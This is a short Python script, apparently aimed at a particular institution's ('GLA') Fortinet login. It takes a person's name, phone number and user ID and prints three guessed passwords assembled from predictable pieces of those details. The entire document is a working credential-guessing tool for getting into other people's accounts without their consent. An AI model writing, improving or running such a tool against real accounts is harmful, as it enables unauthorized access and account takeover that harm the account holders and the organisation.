# Gla Fire Authentication Password Hack

def fireAuthPassHack():
    print("<--------------Welcome to GLA FireAuth Password Hack center -------------->")

    user_name = input(f'\nEnter your name\n')
    user_pnum = input(f'\nEnter yout phone number\n')
    user_id =  input(f'\nEnter your fortinet ID\n')

    #print(f"\nUser's name is {user_name}, phone number is {user_pnum}  & his user id is {user_id} \n")

    digit_4_5 = user_pnum[3:5]
    digit_8_ = user_pnum[-2:]
    surname_last = user_name[-2:]
    list = ['@','_','.']

    print(f"\nThe password for user id {user_id} may be any on the given below\n")

    count=0
    for token in list:
        count+=1
        print(f"Password case {count} -> {digit_4_5}{token}B{digit_8_}{surname_last}\n")

while True:
    fireAuthPassHack()
    print("\n\n")